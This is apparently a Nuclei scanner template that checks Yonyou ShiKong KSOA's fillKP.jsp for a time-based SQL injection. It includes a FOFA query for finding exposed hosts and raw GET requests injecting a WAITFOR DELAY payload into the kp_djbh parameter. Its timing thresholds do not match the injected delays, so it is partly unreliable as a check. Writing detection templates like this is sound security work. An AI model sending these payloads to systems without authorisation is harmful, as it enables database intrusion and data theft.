id: yongyoushikong-KSOA-fillKP-sql

info:
  name: 用友时空KSOA fillKP.jsp接口SQL延时注入漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: app="用友-时空KSOA"
      用友时空KSOA系统fillKP.jsp接口存在SQL延时注入安全缺陷，攻击者可通过构造恶意SQL语句实现数据库敏感信息获取。该漏洞允许远程未认证用户执行任意SQL查询，可能导致数据库结构暴露、管理员凭证泄露及用户隐私数据窃取。在具备高权限写入条件下，攻击者可进一步向服务器写入WebShell实现系统权限控制。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/140865961
  tags: 用友时空KSOA



http:
- raw:
  - |
    GET /kp/fillKP.jsp?kp_djbh=1';WAITFOR+DELAY+'0:0:3'-- HTTP/1.1
    Host: {{Hostname}}


  - |
    GET /kp/fillKP.jsp?kp_djbh=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
    Host: {{Hostname}}


  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=6 && duration_1<=7'
    - 'duration_2>=8 && duration_2<=9'
    condition: and







